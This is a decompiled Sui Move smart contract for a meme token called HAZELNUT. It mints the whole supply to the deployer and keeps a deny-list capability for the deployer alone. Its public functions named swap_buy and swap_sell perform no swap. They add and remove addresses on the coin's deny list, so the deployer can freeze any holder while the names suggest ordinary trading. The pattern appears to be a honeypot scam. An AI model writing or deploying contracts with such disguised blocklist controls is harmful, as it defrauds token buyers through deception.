module 0xfd7ee639143f1cf72b6763b981a09157e7ea13d528d4dbdcb3ce964bc87677c4::hazelnut {
    struct HAZELNUT has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: HAZELNUT, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<HAZELNUT>(arg0, 9, b"HAZELNUT", b"Mrs. Hazel Nut", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmWuMUnyuDf5sSiCcmdsXGCtcNtVjXDyba6bd7e914EJNt"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<HAZELNUT>(&mut v3, 420690000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<HAZELNUT>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<HAZELNUT>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<HAZELNUT>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<HAZELNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<HAZELNUT>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<HAZELNUT>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<HAZELNUT>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

